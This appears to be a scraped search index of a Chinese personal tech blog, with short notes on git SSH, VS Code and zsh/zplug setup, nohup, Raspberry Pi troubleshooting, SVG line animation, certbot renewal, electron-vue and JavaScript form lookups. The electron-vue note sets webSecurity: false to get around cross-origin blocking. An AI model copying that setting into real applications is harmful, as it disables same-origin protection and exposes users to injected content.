這邊平常使用Github都是https開頭 因為從github看到都是https開頭….. 網路爬了一下有詳細說明 產生 SSH key 給 Bitbucket/Github 使用 | 噴火獸號：裴列恩之艦 希望不要下次再採雷XD 參考來源： 產生 SSH key 給 Bitbucket/Github 使用 | 噴火獸號：裴列恩之艦 ","date":"2018-04-08","objectID":"/blog/posts/git%E4%B8%8D%E9%9C%80%E8%A6%81%E6%89%93%E5%B8%B3%E8%99%9F%E5%AF%86%E7%A2%BCpush/:0:0","tags":["git","ssh","bitbucket","github","hexo"],"title":"git不需要打帳號密碼push(SSH)","uri":"/blog/posts/git%E4%B8%8D%E9%9C%80%E8%A6%81%E6%89%93%E5%B8%B3%E8%99%9F%E5%AF%86%E7%A2%BCpush/"},{"categories":["實用工具"],"content":"這篇記錄我在code設定command line設定 Visual Studio Code設定 { \"terminal.integrated.shell.windows\": \"C:\\\\Users\\\\Administrator\\\\.babun\\\\cygwin\\\\bin\\\\zsh.exe\", \"terminal.integrated.fontFamily\": \"Hack\", } 但是後來決定放棄使用這個 打算使用cmder…，不過在VSCode 使用設定 | Mo1cibo’s Blog 有看到好像也是跟我一樣的問題 後來決定使用cmder，不過發現cmder.exe快捷鍵ctrl+‵可以彈出，再按一次ctrl+‵ 可以再縮小 感覺也沒必要再設定….. 不過還是紀錄爬文設定 // Command Prompt \"terminal.integrated.shell.windows\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\" // PowerShell \"terminal.integrated.shell.windows\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\" // Git Bash \"terminal.integrated.shell.windows\": \"C:\\\\Program Files\\\\Git\\\\bin\\\\bash.exe\" // Bash on Ubuntu (on Windows) \"terminal.integrated.shell.windows\": \"C:\\\\Windows\\\\System32\\\\bash.exe\" // zsh \"terminal.integrated.shell.windows\": \"C:\\\\Windows\\\\System32\\\\bash.exe\", \"terminal.integrated.shellArgs.windows\": [ \"-c\", \"zsh\" ], // cmder \"terminal.integrated.shell.windows\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"terminal.integrated.shellArgs.windows\": [ \"/K\", \"C:\\\\cmder\\\\vscode.bat\" ], // font \u0026 fontSize \"terminal.integrated.fontFamily\": \"DejaVu Sans Mono for powerline\", \"terminal.integrated.fontSize\": 15, 發現window可以用Ubuntu來啟動zsh 我是用同事介紹的babun 不過window感覺用cmder還滿順 應該會先使用這個為優先 參考來源: VSCode 使用設定 | Mo1cibo’s Blog ","date":"2018-04-08","objectID":"/blog/posts/Code%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E5%AD%97%E5%85%83%E8%A8%AD%E5%AE%9A%E7%82%BAzsh/:0:0","tags":["zsh","visual studio code"],"title":"Code命令提示字元設定為zsh","uri":"/blog/posts/Code%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E5%AD%97%E5%85%83%E8%A8%AD%E5%AE%9A%E7%82%BAzsh/"},{"categories":["寫程式一些事"],"content":"最近寫blog很長手動打` 想說snippet來增加寫文章速度 也不用在找asset_img` 語法我真的記不太住…. 目前我為Hexo設定的snippets { \"Read More\": { \"prefix\": \"!more\", \"body\": [ \"\u003c!--more--\u003e\" ], \"description\": \"Read More\" }, \"asset_img\": { \"prefix\": \"asset\", \"body\": [ \"![${1:title}](./${1:img.png})\" ], \"description\": \"asset_img\" }, \"asset_link\": { \"prefix\": \"asset\", \"body\": [ \"[${1:title}](${1:url})\" ], \"description\": \"asset_link\" } } 這三個寫文章應該很夠用 ##參考來源 snippet generator ","date":"2018-04-08","objectID":"/blog/posts/Code%E8%87%AA%E8%A8%82snippet/:0:0","tags":["snippet","vscode"],"title":"Code自訂snippet","uri":"/blog/posts/Code%E8%87%AA%E8%A8%82snippet/"},{"categories":["寫程式一些事"],"content":"設定筆記紀錄 # URL ## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/' url: . root: /blog/ permalink: :year/:month/:day/:title/ permalink_defaults: ","date":"2018-04-08","objectID":"/blog/posts/Hexo%E8%A8%AD%E5%AE%9Ablog%E5%AD%90%E8%B3%87%E6%96%99%E5%A4%BE%E7%B6%B2%E5%9D%80/:0:0","tags":["hexo","url"],"title":"Hexo設定blog子資料夾網址","uri":"/blog/posts/Hexo%E8%A8%AD%E5%AE%9Ablog%E5%AD%90%E8%B3%87%E6%96%99%E5%A4%BE%E7%B6%B2%E5%9D%80/"},{"categories":["Linux"],"content":"最近有一台樹莓派網路比較不穩 想到另外一台做ping的動作 但是command line怎麼背景執行?? \u0026 只要在command後面加\u0026 就能背景執行 想不到這麼簡單 不過關掉command就會不見了 正確來說好像還會繼續執行樣子…(nohup和\u0026的区别 - xiaohuazi - 博客园) nohup … \u0026 在前面加入nohup 關掉command就會背景執行 會輸出到nohup.out nohup 跟 \u0026 的指令差別 sh 22.sh \u0026 将任务放到后台 ，即使关闭xshell退出当前session依然继续运行，但标准输出和标准错误信息会丢失 nohup sh 22.sh 将任务放到后台，关闭标准输入，前台不再能够接收任何输入（标准输入），重定向标准输出和标准错误到当前目录下的nohup.out文件，即使关闭xshell退出当前session依然继续运行。 nohup sh 22.sh \u0026 将任务放到后台，但是依然可以使用标准输入，前台能够接收任何输入，重定向标准输出和标准错误到当前目录下的nohup.out文件，即使关闭xshell退出当前session依然继续运行。 nohup和\u0026的缺点是，如果你要在一个shell会话里面执行多个命令和脚本，那么要每个命令和脚本都要加nohup和\u0026非常麻烦，所以才有了screen和TMUX nohup和\u0026的区别 - xiaohuazi - 博客园 $ nohup your_command \u0026\u003emyout.txt \u0026 可以重新導向新的輸出 但注意\u0026\u003e是連在一起的，不能分開 看到這篇…，突然想到screen跟tmux 還沒記筆記，不過也忘了一半 改天再補… 發現Linux 做ping動作不會有時間… Linux/Windows下Ping测试加上返回时间戳的方法 - 彩荷z Linux下长时间ping网络加时间戳并记录到文本 - CSDN博客 參考來源 [linux[tips]nohup: 讓command在遠端執行，不因登出而中斷 @ 真實旅程 :: 痞客邦 :: nohup和\u0026的区别 - xiaohuazi - 博客园 Linux 學習日誌: 把命令放到背景執行 鳥哥的 Linux 私房菜 – Linux 常用網路指令介紹 追蹤連線區域網路裝置的Raspberry Pi掃描器 - Make 國際中文版 \u003e DIY Projects, Inspiration, How-tos, Hacks, Mods \u0026 More @ Makezine.com.tw - Tweak Technology to Your Will Linux 學習日誌: 把命令放到背景執行 nohup和\u0026後臺執行，程序檢視及終止 - 掃文資訊 ","date":"2018-03-31","objectID":"/blog/posts/logdown/2018-03-31-linux-command-background-execution-turn-off-continue-work/:0:0","tags":["nohup","Linux"],"title":"Linux [nohup]背景執行(command關掉繼續work)","uri":"/blog/posts/logdown/2018-03-31-linux-command-background-execution-turn-off-continue-work/"},{"categories":["Linux"],"content":"最近樹莓派網路越來越不穩定… 有時候對突然連不到… 重開主機就可以了 但這樣下去 不是辦法 所以買一個USB To TTL這個東西跟Raspberry PI 連接 首先，USB To TTL | Raspberry Pi台灣樹莓派 基本上照上面做就可以連接到了 不過…，不知到插上去的位置 RPi Low-level peripherals - eLinux.org 照上面對照GPIO就不會插錯了 也有發現用網路線連接方法1.6 直接 連接到 另外一部電腦(用網路線) - 學習樹莓派–Raspberry Pi 不過也懶的插來插去 買個TTL預防萬一 結果網路問題ifdown eth0再ifup eth0 就能work了…. 不知道是DHCP問題還是樹莓派問題… 還要先繼續觀查… ","date":"2018-03-31","objectID":"/blog/posts/logdown/2018-03-31-raspberry-pi-uses-usb-to-ttl-connection/:0:0","tags":["Raspberry PI","TTL"],"title":"Raspberry pi 使用USB To TTL連接","uri":"/blog/posts/logdown/2018-03-31-raspberry-pi-uses-usb-to-ttl-connection/"},{"categories":["網頁特效"],"content":"Sketch.js 最近看到TVアニメ『LOST SONG』網站還滿酷的 所以研究了一下，發現是使用sketch.js 本來想說是很復雜的東西 結果看了一下，發現是用官網範例Plasmatic Isosurface 好像把dat.ui拿掉就跑出上面樣子 插點看WebGL那邊去了XD 不過發現圖象矩陣，感覺也是一門大坑學問 TVアニメ『LOST SONG』 sketch.js 2018鐵人賽索引和心得(圖多慎入) - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 Plasmatic Isosurface WebGL 技术储备指南 | Taobao FED | 淘宝前端团队 soulwire/Plasmatic-Isosurface: A 2 dimensional plasma simulation running on the GPU, written in GLSL and CoffeeScript and rendered with WebGL. 矩陣 详解CSS的矩阵变换函数matrix() | 中二病也要玩 front end 【介紹】Geogebra 與線性變換矩陣（1／8）：矩陣變換與圖形 - YouTube 详解CSS的矩阵变换函数matrix() | 中二病也要玩 front end CSS3 transform-function matrix 變形矩陣 CSS3 matrix双板划水、拉伸、打板动画实例animation-亮术网 THE MAGNIFICENT 2D MATRIX 如何通过js获取到CSS3里面transform rotate旋转角度的度数，matrix解析 - CSDN博客 Matrix rain animation using HTML5 canvas and javascript ","date":"2018-03-29","objectID":"/blog/posts/logdown/2018-03-29-7072140/:0:0","tags":["sketchJS","webGL","matrix"],"title":"動畫特效繪制框架(Sketch.js)","uri":"/blog/posts/logdown/2018-03-29-7072140/"},{"categories":["Linux"],"content":"Solved: cron question about multiple commands - Hewlett Packard Enterprise Community Re: cron question about multiple commands \"echo ; ls\" will execute both echo and ls, whatever is echo exit code. \"echo \u0026\u0026 ls\" will execute ls only if echo exit code is 0. Maybe you should do a script. Complex lines in crontab make it not clear and harder to maintain. Regards, Fred -- \"Reality is just a point of view.\" (P. K. D.) 我有做個小實驗，簡單來講exit code;會傳回最後一個 但是\u0026\u0026會兩個看有沒有有沒有成功 Imgur ","date":"2018-03-26","objectID":"/blog/posts/logdown/2018-03-26-7062187/:0:0","tags":["Linux"],"title":"連續打指令\u0026\u0026 與;差別","uri":"/blog/posts/logdown/2018-03-26-7062187/"},{"categories":["Linux"],"content":"最近玩linux用到… 不過還沒實作過 因為要做logdown移轉動作 先筆記存檔一下 Ubuntu 16.04设置rc.local开机启动命令/脚本的方法_Linux教程_Linux公社-Linux系统门户网站 Update-rc.d \u0026\u0026 rc.local管理Ubuntu的开机启动 - CSDN博客 fecbob.pixnet.net/blog/post/39347095-linux%E9%96%8B%E6%A9%9F%E8%87%AA%E5%8B%95%E5%95%9F%E5%8B%95 centos 在CentOS下配置自启动服务 | 王超的技术博客 ","date":"2018-03-26","objectID":"/blog/posts/logdown/2018-03-26-7060577/:0:0","tags":["rc.local","update-rc.d"],"title":"開機執行程式(/etc/rc.d/rc.local、Update-rc.d)筆記","uri":"/blog/posts/logdown/2018-03-26-7060577/"},{"categories":["Linux"],"content":"很奇怪…今天Raspberry pi 開機遇到emergency mode Welcome to emergency mode! After logging in, type \"journalctl -xb\" to view system logs, \"systemctl reboot\" to reboot, \"systemctl default\" to try again to boot into default mode. Give root password for maintenance (or type Control-D to continue): 平常沒有用鍵盤USB，剛好最近買一個機械式鍵盤剛好是USB 剛好可以插在上面，原本還滿擔心可能不能用的問題 好險沒有 按Enter竟然可以進去桌面 (可能在系統升級跑到桌面設定) 後來rasp-config把console設定回來 難怪升級之後，覺得開機有比較慢XD /etc/fstab我也沒有加什麼東西上去… 於是我fsck /dev/mmcblk0p2修壞軌就能開機了 不過接hdmi發現右上角有閃電符號… 我原本以為是不是充電… 树莓派屏幕右上角闪电符号是什么意思_树莓派吧_百度贴吧 查詢結果是電壓不足…. 不過後來有把鍵盤+滑鼠USB 拿掉就沒有顯示出來 可以機械式鍵盤上面的燈太耗電了吧XD 希望不要再壞一次了 參考來源： ubuntu 进入 emergency mode 解决 – 累不死的牛 阿就操場啊~: Linux開機進入emergency mode ","date":"2018-03-26","objectID":"/blog/posts/logdown/2018-03-26-7060547/:0:0","tags":["Raspberry PI"],"title":"Raspberry pi 遇到emergency mode問題","uri":"/blog/posts/logdown/2018-03-26-7060547/"},{"categories":["網頁特效"],"content":"因為要做blog轉移，所以我就簡單的說明… CSS的小箭頭 | 前端，沒有極限 上面說得很清楚，是用border繪制出來的 在把其他地方沒用到border顏色改成transparent 只不過從來沒有想過border可以這樣運用 參考來源： cssarrowplease CSS的小箭頭 | 前端，沒有極限 ","date":"2018-03-25","objectID":"/blog/posts/logdown/2018-03-25-7057276/:0:0","tags":["CSS"],"title":"css的小箭頭原理","uri":"/blog/posts/logdown/2018-03-25-7057276/"},{"categories":["網頁特效"],"content":"例用CSS ANIMTION畫邊框 https://jsbin.com/huteruhopa/edit?html,css,output 上面例用CSS Animation做繪制邊框、填色動作 參考了CSS + SVG stroke 動態描繪 | 前端，沒有極限 SVG 研究之路 (6) - stroke 邊框 - OXXO.STUDIO ","date":"2018-03-25","objectID":"/blog/posts/logdown/2018-03-25-7057242/:0:0","tags":["SVG","CSS","animation"],"title":"svg畫邊特效","uri":"/blog/posts/logdown/2018-03-25-7057242/"},{"categories":["網頁特效"],"content":"stroke-dasharray 虛線 Value: none | \u003c dasharray\u003e | inherit stroke-dasharray - SVG | MDN ","date":"2018-03-25","objectID":"/blog/posts/logdown/2018-03-25-7057242/:1:0","tags":["SVG","CSS","animation"],"title":"svg畫邊特效","uri":"/blog/posts/logdown/2018-03-25-7057242/"},{"categories":["網頁特效"],"content":"什麼是 dasharray? stroke-dasharray是把stroke做成了是虛線的效果，線段會被拆成線段、空白、線段、空白 原本這句看不是很懂，但是從實側做一下 就是 線段長度{1} 空白{0,1} 當只有一個數字 線段、空白都會設為一樣長度(有點像margin、padding) 當然也可以設定不一樣 100 20 30 20 ‘stroke-dasharray’ controls the pattern of dashes and gaps used to stroke paths. contains a list of comma and/or white space separated s and s that specify the lengths of alternating dashes and gaps. If an odd number of values is provided, then the list of values is repeated to yield an even number of values. Thus, stroke-dasharray: 5,3,2 is equivalent to stroke-dasharray: 5,3,2,5,3,2. Painting: Filling, Stroking and Marker Symbols – SVG 1.1 (Second Edition) ","date":"2018-03-25","objectID":"/blog/posts/logdown/2018-03-25-7057242/:2:0","tags":["SVG","CSS","animation"],"title":"svg畫邊特效","uri":"/blog/posts/logdown/2018-03-25-7057242/"},{"categories":["網頁特效"],"content":"原理 好了，知道這樣還是沒法知道為什麼可以連線過去 stroke-dashoffset屬性是將上面的虛線推移，兩者會有以下幾點特性： 推移後，dasharray還是會保持循環。 dashoffset的值不會大於dasharray。 如果dashoffset 等於 dasharray，線段起始點會是空白。 這當出原理看不是很了解 原來線長度是dasharray把線段、空白設定一樣長度 然後對dashoffset做位移動作 例如： svg裡的line 500 dasharray線段500空白500 當你做dashoffset 自然而然沒有線，不過dashoffset超過500以上就會跑出來了 !!!!等等那不是就沒法做到畫線方法!!!! 但只要再把dasharray跟dashoffset設定2000 只要大於你的邊線長度就沒有問題了 知道原理真的豁然開朗XD https://jsbin.com/duhudisifi/edit?html,css,output 小小的改造成慢慢消失 vivus.js 在網路上爬到HTML5 SVG图形轮廓线条绘制动画插件-vivus_jQuery之家-自由分享jQuery、html5、css3的插件库 有中文翻譯…，果然有中文我才能吸收 orz 下面是一些你在使用SVG文件时需要注意的问题： SVG必须以内联的方式放置在HTML文件中，另外不能使用javascript来操控它。 所有的元素都必须有stroke属性而且不能填充图形。因为插件只是绘制图形的轮廓而不会去检查它的颜色。例如：fill: “none”; ，stroke: “#FFF”;。 你应该避免创建隐藏的SVG元素。Vivus会在执行动画前过滤掉一些不合格的元素。如果隐藏SVG没有被过滤掉，在执行路径动画时将会出现一些空白区域和缝隙。 不允许使用text元素，它们不能被转换为path元素。 TVアニメ「ノラと皇女と野良猫ハート」公式サイト 左上角的logo是用兩個svg作處理 我原本以為那個vivus.js有做填色效果…. 結果後來發現有兩個svg orz 這兩個方法差別一個是用css，另一個是用js 但原理都相同… 所以把TVアニメ「ノラと皇女と野良猫ハート」公式サイト完整SVG 用到https://jsbin.com/huteruhopa/edit?html,css,output 改一下CSS的class .cls-2 哈 也是可以用XD var hi = new Vivus('hi-there', {duration: 500} ,function () { if (window.console) { console.log('Animation finished. [log triggered from callback]'); } }); 然後這篇文章我放著多天… 終於補完了… 參考來源： https://maxwellito.github.io/vivus/ http://nora-anime.net/ CSS + SVG stroke 動態描繪 | 前端，沒有極限 SVG 研究之路 (6) - stroke 邊框 - OXXO.STUDIO 一个封装了vivus的vue组件，能够播放svg路径动画 - JavaScript开发社区 | CTOLib码库 10 个非常有用的 SVG 动画的 JavaScript 库 - 简书 Vivus js ","date":"2018-03-25","objectID":"/blog/posts/logdown/2018-03-25-7057242/:3:0","tags":["SVG","CSS","animation"],"title":"svg畫邊特效","uri":"/blog/posts/logdown/2018-03-25-7057242/"},{"categories":["實用工具"],"content":"最近想記錄我在筆電上面的終端機設定 但以經放著多天，最近在最有空的時候準備整理一下 本來想用圖片整理，但logdown不能上傳圖片 未來會考慮用hexo來用… 不過在用hexo之後，剛好看到asciinema可以錄制command指令 想說先用這個東西來試試 官方網站有介紹Getting started - asciinema安裝步驟 不過…試過sudo apt-get install asciinema 在錄制的時候在upload會說版本太舊… 想說用pip3應該就不會有問題 沒想到我電腦沒有pip3 #安裝pip3 sudo apt-get install python3-pip #安裝pip sudo apt-get install python-pip 沒想到在做sudo pip3 install asciinema 竟然跳出pip版本問題… pip3 install --upgrade pip 再執行 sudo pip3 install asciinema 可以順利安裝 ","date":"2018-03-25","objectID":"/blog/posts/logdown/2018-03-25-terminal-recording-tool-asciinema/:0:0","tags":["asciinema"],"title":"終端機錄制工具 asciinema","uri":"/blog/posts/logdown/2018-03-25-terminal-recording-tool-asciinema/"},{"categories":["實用工具"],"content":"asciinema rec [filename] 錄制開始，結束會問要不要上傳 ","date":"2018-03-25","objectID":"/blog/posts/logdown/2018-03-25-terminal-recording-tool-asciinema/:1:0","tags":["asciinema"],"title":"終端機錄制工具 asciinema","uri":"/blog/posts/logdown/2018-03-25-terminal-recording-tool-asciinema/"},{"categories":["實用工具"],"content":"asciinema play [filename] 播放 ","date":"2018-03-25","objectID":"/blog/posts/logdown/2018-03-25-terminal-recording-tool-asciinema/:2:0","tags":["asciinema"],"title":"終端機錄制工具 asciinema","uri":"/blog/posts/logdown/2018-03-25-terminal-recording-tool-asciinema/"},{"categories":["實用工具"],"content":"asciinema cat [filename] 查看顯示結果 ","date":"2018-03-25","objectID":"/blog/posts/logdown/2018-03-25-terminal-recording-tool-asciinema/:3:0","tags":["asciinema"],"title":"終端機錄制工具 asciinema","uri":"/blog/posts/logdown/2018-03-25-terminal-recording-tool-asciinema/"},{"categories":["實用工具"],"content":"asciinema upload [filename] 上傳到asciinema網站上面 錄制結果如下 參考來源： 升级pip3的正确姿势 - 简书 ","date":"2018-03-25","objectID":"/blog/posts/logdown/2018-03-25-terminal-recording-tool-asciinema/:4:0","tags":["asciinema"],"title":"終端機錄制工具 asciinema","uri":"/blog/posts/logdown/2018-03-25-terminal-recording-tool-asciinema/"},{"categories":["Apache"],"content":"之前有做TSL加密自動化憑證 但是遇到一些問題 例否我更新Linux導至Certbot壞掉 但重安裝Certbot就沒有這個問題 除了我有設定防火牆問題 但還是失敗 不過最後還是找到原因，記錄一下 更新完套件，指令換成了certbot 但用法還是大同小異 不過還是更新失敗了 首先手動執行 .certbot renew --dry-run 查看有什麼錯誤資訊 ------------------------------------------------------------------------------- Processing /etc/letsencrypt/renewal/zhukun.net.conf ------------------------------------------------------------------------------- Cert not yet due for renewal The following certs are not due for renewal yet: /etc/letsencrypt/live/zhukun.net/fullchain.pem (skipped) No renewals were attempted. 有遇到正常的log 但看瀏覽器幫很正常… 後來爬文，原來要重啟apache… 有看到用hook-post方法 certbot renew --post-hook \"service httpd restart\" 不知道reload會不會就可以了 只能等下次5月更新才知道 启用Let’s Encrypt的免费SSL证书 | 月与灯依旧 Let’s Encrypt SSL安装出现问题 - Linux面板 - 宝塔面板论坛 letsencrypt 工具改成 certbot 了 | 壞蛋的密室 通过Certbot配置Let’s Encrypt的SSL（Apache） | StringBlog ","date":"2018-03-03","objectID":"/blog/posts/logdown/2018-03-03-6672669/:0:0","tags":["Linux","Aapache","certbot"],"title":"Certbot更新憑證失敗記錄","uri":"/blog/posts/logdown/2018-03-03-6672669/"},{"categories":["Linux"],"content":"enhancd有點像sublime text功能一樣 可快速選到你要的檔案 但他好像是抓取你進去過的目錄 沒進去可能無法抓到 用講的很難理解，看影片比較快XD URL b4b4r07/enhancd: A next-generation cd command with an interactive filter ","date":"2018-01-22","objectID":"/blog/posts/logdown/2018-01-22-super-terminal-enhancd/:0:0","tags":["zplug","Linux","zsh"],"title":"超級終端機 enhancd","uri":"/blog/posts/logdown/2018-01-22-super-terminal-enhancd/"},{"categories":["Linux"],"content":"感覺就是fzy的進階版 他可以多選fzy -m，按tab可做選擇動作 官網其中範例 find * -type f | fzf \u003e selected 其實還有滿多vim範例的 但我都不太熟 哈 fzf --preview 'cat {}' 這個預覽工能也滿強大的XD 參考來源： 模糊搜索神器fzf - 验证的进阶之路 - SegmentFault 思否 junegunn/fzf: A command-line fuzzy finder 模糊搜索神器fzf - 掃文資訊 ","date":"2018-01-22","objectID":"/blog/posts/logdown/2018-01-22-5198700/:0:0","tags":["zsh","Linux","zplug"],"title":"超級終端機 fzf","uri":"/blog/posts/logdown/2018-01-22-5198700/"},{"categories":["Linux"],"content":"網路上看到fzy工具 感覺在選擇多個檔案會很有幫助 zplug \"jhawthorn/fzy\", \\ as:command, \\ rename-to:fzy, \\ hook-build:\" { make sudo make install } \u0026\u003e/dev/null \" ``` [![asciicast](https://asciinema.org/a/TNkbpJmduO878wMUsr6iyobxF.png)](https://asciinema.org/a/TNkbpJmduO878wMUsr6iyobxF) ","date":"2018-01-22","objectID":"/blog/posts/logdown/2018-01-22-super-terminal-fzy/:0:0","tags":["zplug","Linux","zsh"],"title":"超級終端機 fzy","uri":"/blog/posts/logdown/2018-01-22-super-terminal-fzy/"},{"categories":["Linux"],"content":"常常因為要做cd ../..而煩腦嗎 發現有人介紹zplug其中一個套件 bd 這指令跟bd是相反的 zplug 安裝方法 zplug \"tarrasch/zsh-bd\", at:3724233, frozen:1 URL ","date":"2018-01-22","objectID":"/blog/posts/logdown/2018-01-22-super-terminal-bd/:0:0","tags":["zplug","Linux","zsh"],"title":"超級終端機 bd","uri":"/blog/posts/logdown/2018-01-22-super-terminal-bd/"},{"categories":["Linux"],"content":"oh-my-zsh有一個指令補全功能 再我裝zsh在elementary OS 上面少這個功能 就不太習慣XD 好來我找到了 在oh-my-zsh/completion.zsh at master · robbyrussell/oh-my-zsh抓下來(檔案抓下來，對照設定檔錄徑) .zshrc設定 #　TAB 補完選單 source ~/.zplug/completion.zsh 就能完成了 URL oh-my-zsh/completion.zsh at master · robbyrussell/oh-my-zsh Installing zsh-autosuggestions - asciinema ","date":"2018-01-22","objectID":"/blog/posts/logdown/2018-01-22-super-terminal-command-completion/:0:0","tags":["zplug","Linux","zsh"],"title":"超級終端機 指令補全","uri":"/blog/posts/logdown/2018-01-22-super-terminal-command-completion/"},{"categories":["Linux"],"content":"[2018 鐵人賽] 簡潔高效的 PHP \u0026 Laravel 工作術：從 elementary OS 下手的聰明改造提案 #11 source ~/.zplug/init.zsh #　TAB 補完選單 source ~/.zplug/completion.zsh export DEFAULT_USER=`whoami` POWERLEVEL9K_LEFT_PROMPT_ELEMENTS=(dir newline vcs) zplug \"bhilburn/powerlevel9k\", use:powerlevel9k.zsh-theme # 排序安裝 zplug \"zsh-users/zsh-syntax-highlighting\", defer:2 # 從 Github 安裝 zplug \"zsh-users/zsh-history-substring-search\" # 從 on-my-zsh 安裝 zplug \"plugins/git\", from:oh-my-zsh # 依作業系統載入 zplug \"lib/clipboard\", from:oh-my-zsh, if:\"[[ $OSTYPE == *darwin* ]]\" #docker compose zplug \"plugins/docker-compose\", from:oh-my-zsh zplug \"b4b4r07/enhancd\", use:init.sh zplug \"tarrasch/zsh-bd\", at:3724233, frozen:1 zplug \"jhawthorn/fzy\", \\ as:command, \\ rename-to:fzy, \\ hook-build:\" { make sudo make install } \u0026\u003e/dev/null \" zplug \"junegunn/fzf-bin\", as:command, from:gh-r, rename-to:fzf # ついでに tmux 用の拡張も入れるといい zplug \"junegunn/fzf\", as:command, use:bin/fzf-tmux if ! zplug check --verbose; then printf \"Install? [y/N]: \" if read -q; then echo; zplug install fi fi #沒有用 #POWERLEVEL9K_MODE=\"Hack\" zplug load 解決zplug install unknow error 安裝gawk sudo apt-get install gawk ","date":"2018-01-22","objectID":"/blog/posts/logdown/2018-01-22-5198665/:0:0","tags":["zplug","Linux","zsh"],"title":"超級終端機 zplug","uri":"/blog/posts/logdown/2018-01-22-5198665/"},{"categories":["electron"],"content":"最近剛好看到vue-electron 剛好手頭想做一個桌面程式 就想嘗試看看 # 安装 vue-cli 和 脚手架样板代码 npm install -g vue-cli vue init simulatedgreg/electron-vue my-project # 安装依赖并运行你的程序 cd my-project npm install npm run dev 先不要安裝es-lint 打開Visual Studio Code就可以改程式 而且存檔都會自動重新載入 剛開始試著改程式，都沒辦法載入成功 後來是發現es-lint不要安裝 就不會有問題了 連編譯exe設定都幫你設定好了 這真的太棒了 npm run build 目前有用簡單功能，有做ajax動作 爬文以後，有看到vue-electron內建有axios axios可以使用ajax功能 跨網域預設還是會擋的 在main/index.js設定webPreferences: { webSecurity: false } mainWindow = new BrowserWindow({ height: 563, useContentSize: true, width: 1000, webPreferences: { webSecurity: false } }); 有做跨網域的問題就可以解決 然後還可以做熱更新 改日再研究 Auto Updater 參考來源 简介 · electron-vue axios cros - Google 搜尋 vue cli+axios踩坑記錄+攔截器使用，代理跨域proxy - 掃文資訊 vue結合axios使用入門 - IT閱讀 vue 使用axios 跨域請求數據的問題 - IT閱讀 如何获取前台input file中的文件上传路径？ - 知乎 Using electron-builder · electron-vue Code Signing · electron-builder ","date":"2018-01-20","objectID":"/blog/posts/logdown/2018-01-20-5134612/:0:0","tags":null,"title":"vue-electron測試使用初體驗","uri":"/blog/posts/logdown/2018-01-20-5134612/"},{"categories":["程式心法"],"content":"一直以來我以為GET POST都有長度限制… 但看了下面文章，發現不是這一回事… 本來要做實驗，最近要做blog搬移 有空再寫一篇文章 淺談 HTTP Method：表單中的 GET 與 POST 有什麼差別？ - Soul \u0026 Shell Blog 【HTTP】GET传参最大长度的理解误区 - 简书 圖解HTTPS、GET和POST - 壹讀 ","date":"2018-01-15","objectID":"/blog/posts/logdown/2018-01-15-4769997/:0:0","tags":null,"title":"有關GET POST 傳輸內容","uri":"/blog/posts/logdown/2018-01-15-4769997/"},{"categories":["JavaScript"],"content":"為什麼能用document.form1.username這個東西? 這個困擾我很久…，在這公司這幾年 常常看到舊的code，從不解用成習慣 同事也不知道為什麼，古早人都是這樣寫 之前有找，但沒有找到相關資訊… 今天花一些時間找到資料，終於找到為什麼 平常見網路教使用document.form1.elements['username']或document.forms['form1'].elements['uername']. 公司常見寫法document.form1.username，只知道form1是用name不是用id去命名的 一直思考到今日，我又繼續查 JavaScript Properties 今天爬到物件的使用 - JavaScript | MDN這篇 The exception to this rule is objects reflected from HTML, such as the forms array. You can always refer to objects in these arrays by either their ordinal number (based on where they appear in the document) or their name (if defined). For example, if the second tag in a document has a NAME attribute of “myForm”, you can refer to the form as document.forms[1] or document.forms[“myForm”] or document.myForm. 當下嘗試寫下面code var a = []; a['length']; //return 0 //常見的a.length 竟然能work 看到這篇我晃然大悟… ","date":"2018-01-15","objectID":"/blog/posts/logdown/2018-01-15-4769676/:0:0","tags":["JavaScript"],"title":"[JS]為什麼能用document.form1.username呢?","uri":"/blog/posts/logdown/2018-01-15-4769676/"},{"categories":["JavaScript"],"content":"今天我終於還債了，開心:D ","date":"2018-01-15","objectID":"/blog/posts/logdown/2018-01-15-4769676/:1:0","tags":["JavaScript"],"title":"[JS]為什麼能用document.form1.username呢?","uri":"/blog/posts/logdown/2018-01-15-4769676/"},{"categories":["JavaScript"],"content":"簡單深入了解 document.forms傳回HTMLCollection東西 HTMLCollection在W3C文件可以看見 element = collection[name] Returns the first element with ID or name name from the collection. DOM Standard 所以document.forms.(name)跟document.forms.(id)都可以抓到 做到這邊我發現怪怪的… document.(form1)怎麼可以抓到name，但不能抓到ID 不過先排除HTMLCollection一樣問題 直接找W3C文件Document文件Named elements Exposed embed, form, iframe, img, or exposed object elements that have a name content attribute whose value is name, or Exposed object elements that have an id content attribute whose value is name, or img elements that have an id content attribute whose value is name, and that have a non-empty name content attribute present also. An embed or object element is said to be exposed if it has no exposed object ancestor, and, for object elements, is additionally either not showing its fallback content or has no object or embed descendants. 看了文件驚呆了，原來不是只有name會抓，object的id也會抓，還有img有id跟name的時候，才會在document.(id)出現 WTF這什麼鬼?! 不過文件規定是這樣應該就沒錯了…，不知道這樣設計是運用在什麼地方 至少不會再踩到雷了吧XD 再來是Form文件HTML Standard id跟name都能吃到，詳細就自己去看 ","date":"2018-01-15","objectID":"/blog/posts/logdown/2018-01-15-4769676/:1:1","tags":["JavaScript"],"title":"[JS]為什麼能用document.form1.username呢?","uri":"/blog/posts/logdown/2018-01-15-4769676/"},{"categories":["JavaScript"],"content":"20180124 發現window也跟document一樣有帶有屬性[HTMLCollection] 難怪平常看到form1，可以正常跑，是因為抓到window變數 突然恍然大悟，window.(id)可以抓到我設定的 ","date":"2018-01-15","objectID":"/blog/posts/logdown/2018-01-15-4769676/:1:2","tags":["JavaScript"],"title":"[JS]為什麼能用document.form1.username呢?","uri":"/blog/posts/logdown/2018-01-15-4769676/"},{"categories":["JavaScript"],"content":"BTW 其實找超久的，原本從MDN裡的document,form手冊看 沒有看到我要的，我又從W3C找有沒有相關內容 結果還是沒有…，不過好在爬到MDN物件的使用 - JavaScript | MDN這篇 為什麼許多教學文不會教document.form1.username? 